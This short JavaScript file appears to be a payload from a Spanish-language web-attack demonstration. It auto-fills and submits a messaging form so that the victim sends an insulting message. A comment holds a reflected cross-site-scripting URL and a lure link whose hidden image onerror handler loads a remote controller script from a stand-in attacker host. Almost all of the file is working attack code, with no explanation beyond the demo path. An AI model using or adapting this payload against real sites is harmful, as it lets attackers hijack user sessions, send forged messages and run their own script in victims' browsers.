document.getElementById("destino").value = "2";
document.getElementById("asunto").value = "Lo que pienso de ti";
document.getElementById("texto").value = "Mira. No sirves ni para ensobrar las cartas. Ni sabes lo que hay que hacer ni eres capaz de entenderlo.";

document.getElementsByTagName("form")[0].submit();

/*
http://webserver.example.com/aplicacion/envia_mensaje.php?Componer mensaje<img style="display:none" src="a" onerror="var script = document.createElement('script');script.src='http://malicioso.uhw/ataques/demo 08/controla.js';document.body.appendChild(script);"> 

<a href=\'http://webserver.example.com/aplicacion/envia_mensaje.php?Componer mensaje<img style="display:none" src="a" onerror="var script = document.createElement(%27script%27);script.src=%27http://malicioso.uhw/ataques/demo 08/controla.js%27;document.body.appendChild(script);">\'>Hay que verlo</a>
*/
